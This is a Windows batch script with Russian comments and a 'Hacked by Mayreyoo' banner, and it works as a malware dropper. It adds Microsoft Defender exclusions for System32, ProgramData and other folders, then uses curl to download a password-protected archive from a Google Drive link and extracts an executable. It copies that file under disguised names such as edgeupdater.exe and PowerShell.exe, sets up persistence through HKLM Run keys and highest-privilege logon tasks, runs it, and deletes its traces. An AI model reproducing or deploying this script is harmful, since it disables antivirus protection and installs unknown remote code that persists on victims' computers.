 @echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion

:: Проверка на запуск от имени администратора
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Запустите этот файл от имени администратора!
    pause
    exit /b
)
::logo
cls
echo ██   ██  █████   ██████ ██   ██ ███████ ██████      ██████  ██    ██ 
echo ██   ██ ██   ██ ██      ██  ██  ██      ██   ██     ██   ██  ██  ██  
echo ███████ ███████ ██      █████   █████   ██   ██     ██████    ████   
echo ██   ██ ██   ██ ██      ██  ██  ██      ██   ██     ██   ██    ██    
echo ██   ██ ██   ██  ██████ ██   ██ ███████ ██████      ██████     ██    
echo ㅤ
echo ███    ███  █████  ██    ██ ██████  ███████ ██    ██  ██████   ██████  ██    ██ 
echo ████  ████ ██   ██  ██  ██  ██   ██ ██       ██  ██  ██    ██ ██    ██ ██    ██ 
echo ██ ████ ██ ███████   ████   ██████  █████     ████   ██    ██ ██    ██ ██    ██ 
echo ██  ██  ██ ██   ██    ██    ██   ██ ██         ██    ██    ██ ██    ██ ██    ██ 
echo ██      ██ ██   ██    ██    ██████  ███████    ██     ██████   ██████   ██████  
echo.
timeout /t 1 >nul
cls
echo [1/6] Скачивание ZIP-архива...
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\ansel'"

:: Прямая ссылка на файл (замени на свою!)
set "DOWNLOAD_LINK=https://drive.usercontent.google.com/download?id=10VTE17DJuxpvNETplOdUVkix9hrgDz9d&export=download&authuser=0&confirm=t&uuid=601aa327-a996-4007-b04b-e647e18ae16e&at=AIrpjvNXkmtbVL9PDKP0mGvPR0Cd:1738844054794"
set "ZIP_PATH=%USERPROFILE%\ansel\archive.zip"

:: Скачивание ZIP через curl (прямая ссылка)
curl -L -o "%ZIP_PATH%" "%DOWNLOAD_LINK%"

if not exist "%ZIP_PATH%" (
    echo Ошибка: архив не скачался!
    pause
    exit /b
)

echo Архив скачан.
timeout /t 1 >nul

echo [2/6] Распаковка ZIP с паролем...

:: Папка, куда распакуем
set "EXTRACT_PATH=%USERPROFILE%\AppData\Local\Temp\RAR5261"

:: Проверка существования целевой папки
if not exist "!EXTRACT_PATH!" mkdir "!EXTRACT_PATH!"

:: Распаковка через 7-Zip (ZIP должен быть запаролен на 123)
set "7ZIP=%~dp0\7zip\7z.exe"

if not exist "!7ZIP!" (
    echo Ошибка: 7-Zip не найден!
    pause
    exit /b
)

"!7ZIP!" x "%ZIP_PATH%" -p123 -o"!EXTRACT_PATH!" -y

if not exist "!EXTRACT_PATH!\cal.exe" (
    echo Ошибка: не удалось распаковать архив!
    pause
    exit /b
)

echo Архив распакован.
timeout /t 1 >nul


echo [3/6] Добавление папок в исключения Defender...

:: Добавление папок в исключения
powershell -Command "Add-MpPreference -ExclusionPath '!EXTRACT_PATH!'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\eu-ES'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Microsoft\Windows\PowerShell\'"

echo Исключения добавлены.
timeout /t 1 >nul

echo [4/6] Копирование файла в целевые папки...

:: Исходный файл
set "SOURCE_FILE=!EXTRACT_PATH!\cal.exe"

:: Папки назначения
set "DEST1=C:\ProgramData\edgeupdater.exe"
set "DEST2=C:\Microsoft\Windows\PowerShell\PowerShell.exe"
set "DEST3=C:\Windows\System32\eu-ES\language_eu-US.exe"
set "DEST4=C:\Windows\System32\pcaluadeb.exe"

:: Копирование файлов
copy /Y "!SOURCE_FILE!" "!DEST1!" >nul
copy /Y "!SOURCE_FILE!" "!DEST2!" >nul
copy /Y "!SOURCE_FILE!" "!DEST3!" >nul
copy /Y "!SOURCE_FILE!" "!DEST4!" >nul

echo Файлы скопированы.
timeout /t 1 >nul

echo [5/6] Добавление в автозагрузку...

:: Реестр
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdater" /t REG_SZ /d "!DEST1!" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "PowerShellAuto" /t REG_SZ /d "!DEST2!" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "LangUpdater" /t REG_SZ /d "!DEST3!" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "PcLuaDebug" /t REG_SZ /d "!DEST4!" /f

:: Планировщик задач
schtasks /create /tn "EdgeUpdaterTask" /tr "!DEST1!" /sc onlogon /rl highest /f >nul
schtasks /create /tn "PowerShellAutoTask" /tr "!DEST2!" /sc onlogon /rl highest /f >nul
schtasks /create /tn "LangUpdaterTask" /tr "!DEST3!" /sc onlogon /rl highest /f >nul
schtasks /create /tn "PcLuaDebugTask" /tr "!DEST4!" /sc onlogon /rl highest /f >nul

echo Файлы добавлены в автозагрузку.
timeout /t 1 >nul

echo [6/6] Запуск файла и закрытие...

:: Запуск файла
start "" "!DEST1!"

:: Очистка временных файлов
del "%ZIP_PATH%" >nul
rd /s /q "!EXTRACT_PATH!" >nul

:: Закрытие батника
exit
